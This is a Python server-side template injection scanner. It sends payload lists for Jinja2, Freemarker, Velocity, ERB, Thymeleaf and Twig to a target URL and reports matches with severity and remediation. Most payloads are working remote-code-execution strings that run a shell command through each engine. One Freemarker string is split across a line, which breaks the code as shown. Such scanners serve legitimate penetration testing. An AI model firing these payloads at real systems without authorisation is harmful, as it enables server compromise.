#!/usr/bin/env python3
"""
Advanced Template Injection Scanner
Tests for Server-Side Template Injection (SSTI) across multiple template engines
including Jinja2, Freemarker, Velocity, ERB, Thymeleaf, and more
"""

import requests
import json
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

class AdvancedTemplateInjectionScanner:
    """Advanced SSTI vulnerability scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

    def scan(self):
        """Run advanced template injection tests"""
        print(f"[*] Starting advanced SSTI testing on {self.target_url}")

        # Test Jinja2 (Python)
        self._test_jinja2()

        # Test Freemarker (Java)
        self._test_freemarker()

        # Test Velocity (Java)
        self._test_velocity()

        # Test ERB (Ruby)
        self._test_erb()

        # Test Thymeleaf (Java)
        self._test_thymeleaf()

        # Test Twig (PHP)
        self._test_twig()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_jinja2(self):
        """Test for Jinja2 template injection (Python)"""
        print("[*] Testing Jinja2 SSTI...")

        jinja2_payloads = [
            # Basic math
            ('{{7*7}}', '49', 'Basic expression'),
            ('{{7*\'7\'}}', '7777777', 'String multiplication'),

            # Config access
            ('{{config}}', 'Config', 'Config object access'),
            ('{{config.items()}}', 'dict_items', 'Config enumeration'),

            # RCE payloads
            ('{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}', 'uid=', 'RCE via os.popen'),
            ('{{\'\'.__class__.__mro__[1].__subclasses__()}}', 'class', 'Class enumeration'),

            # Safer detection
            ('{{7*\'7\'+7}}', '77777777', 'Math with strings'),
        ]

        for payload, expected, description in jinja2_payloads:
            if self._test_ssti_payload(payload, expected, f'Jinja2 - {description}'):
                return

    def _test_freemarker(self):
        """Test for Freemarker template injection (Java)"""
        print("[*] Testing Freemarker SSTI...")

        freemarker_payloads = [
            # Basic math
            ('${7*7}', '49', 'Basic expression'),
            ('#{7*7}', '49', 'Alternative syntax'),

            # Object creation (Freemarker specific)
            ('${"freemarker.template.utility.Execute"?new()(
"id")}', 'uid=', 'RCE via Execute'),
            ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', 'uid=', 'RCE with assign'),

            # Built-in exposure
            ('${.now}', '202', 'Built-in date function'),

            # Product name
            ('${.version}', 'FreeMarker', 'Version disclosure'),
        ]

        for payload, expected, description in freemarker_payloads:
            if self._test_ssti_payload(payload, expected, f'Freemarker - {description}'):
                return

    def _test_velocity(self):
        """Test for Velocity template injection (Java)"""
        print("[*] Testing Velocity SSTI...")

        velocity_payloads = [
            # Basic math
            ('#set($x=7*7)$x', '49', 'Basic expression'),

            # RCE payloads
            ('#set($s="")#set($chr=$s.class.forName("java.lang.Runtime"))#set($obj=$chr.getRuntime())#set($arr=$s.class.forName("java.lang.String"))$obj.exec("id")', 'uid=', 'RCE via Runtime'),

            # Class loading
            ('$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")', 'uid=', 'Alternative RCE'),

            # Detection
            ('#set($x=7)#set($y=7)$x*$y', '49', 'Variable assignment'),
        ]

        for payload, expected, description in velocity_payloads:
            if self._test_ssti_payload(payload, expected, f'Velocity - {description}'):
                return

    def _test_erb(self):
        """Test for ERB template injection (Ruby)"""
        print("[*] Testing ERB SSTI...")

        erb_payloads = [
            # Basic math
            ('<%= 7*7 %>', '49', 'Basic expression'),

            # RCE payloads
            ('<%= system("id") %>', 'uid=', 'RCE via system'),
            ('<%= `id` %>', 'uid=', 'RCE via backticks'),
            ('<%= IO.popen("id").read %>', 'uid=', 'RCE via IO.popen'),

            # Object inspection
            ('<%= 7*7 %>', '49', 'Safe detection'),
        ]

        for payload, expected, description in erb_payloads:
            if self._test_ssti_payload(payload, expected, f'ERB - {description}'):
                return

    def _test_thymeleaf(self):
        """Test for Thymeleaf template injection (Java)"""
        print("[*] Testing Thymeleaf SSTI...")

        thymeleaf_payloads = [
            # Expression language
            ('[[${7*7}]]', '49', 'Basic expression'),
            ('[(${7*7})]', '49', 'Alternative syntax'),

            # SpringEL RCE
            ('[[${T(java.lang.Runtime).getRuntime().exec(\'id\')}]]', 'Process', 'RCE attempt'),

            # Object access
            ('[[${#ctx}]]', 'Context', 'Context object access'),
        ]

        for payload, expected, description in thymeleaf_payloads:
            if self._test_ssti_payload(payload, expected, f'Thymeleaf - {description}'):
                return

    def _test_twig(self):
        """Test for Twig template injection (PHP)"""
        print("[*] Testing Twig SSTI...")

        twig_payloads = [
            # Basic math
            ('{{7*7}}', '49', 'Basic expression'),
            ('{{7*\'7\'}}', '7777777', 'String multiplication'),

            # RCE payloads
            ('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', 'uid=', 'RCE via filter'),
            ('{{["id"]|filter("system")}}', 'uid=', 'RCE via filter function'),

            # Map filter (safer)
            ('{{["id","id"]|map("md5")|join}}', 'b80bb', 'Filter function test'),

            # Safe detection
            ('{{7*\'7\'+7}}', '77777777', 'Math with strings'),
        ]

        for payload, expected, description in twig_payloads:
            if self._test_ssti_payload(payload, expected, f'Twig - {description}'):
                return

    def _test_ssti_payload(self, payload, expected, description):
        """Test single SSTI payload"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        # Find parameter to inject into
        if params:
            target_param = list(params.keys())[0]
        else:
            target_param = 'q'

        # Build test URL
        test_params = params.copy()
        test_params[target_param] = [payload]

        query_string = urlencode(test_params, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))

        try:
            # Test GET request
            response = self.session.get(test_url, timeout=15)

            # Check if expected output is in response
            if expected in response.text:
                # Determine severity
                severity = 'critical' if 'RCE' in description or 'uid=' in expected else 'high'

                vuln = {
                    'type': 'Server-Side Template Injection (SSTI)',
                    'severity': severity,
                    'url': test_url,
                    'payload': payload,
                    'parameter': target_param,
                    'evidence': f'{description} - Found: {expected}',
                    'description': f'SSTI vulnerability detected: {description}',
                    'cwe': 'CWE-94',
                    'impact': 'Remote code execution, full server compromise',
                    'remediation': 'Use safe rendering, sanitize user input, disable dangerous functions'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] {severity.upper()}: SSTI found - {description}")
                return True

            # Also try POST
            post_data = {target_param: payload}
            response = self.session.post(self.target_url, data=post_data, timeout=15)

            if expected in response.text:
                severity = 'critical' if 'RCE' in description or 'uid=' in expected else 'high'

                vuln = {
                    'type': 'Server-Side Template Injection (SSTI)',
                    'severity': severity,
                    'url': self.target_url,
                    'payload': payload,
                    'parameter': target_param,
                    'method': 'POST',
                    'evidence': f'{description} - Found: {expected}',
                    'description': f'SSTI vulnerability detected: {description}',
                    'cwe': 'CWE-94',
                    'impact': 'Remote code execution, full server compromise',
                    'remediation': 'Use safe rendering, sanitize user input, disable dangerous functions'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] {severity.upper()}: SSTI found (POST) - {description}")
                return True

        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            pass

        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 template_injection_advanced.py <url> [output_file]")
        print("\nExample:")
        print("  python3 template_injection_advanced.py 'https://example.com/search?q=test'")
        print("\nTests for:")
        print("  - Jinja2 SSTI (Python/Flask)")
        print("  - Freemarker SSTI (Java)")
        print("  - Velocity SSTI (Java)")
        print("  - ERB SSTI (Ruby)")
        print("  - Thymeleaf SSTI (Java/Spring)")
        print("  - Twig SSTI (PHP/Symfony)")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    scanner = AdvancedTemplateInjectionScanner(target, output)
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
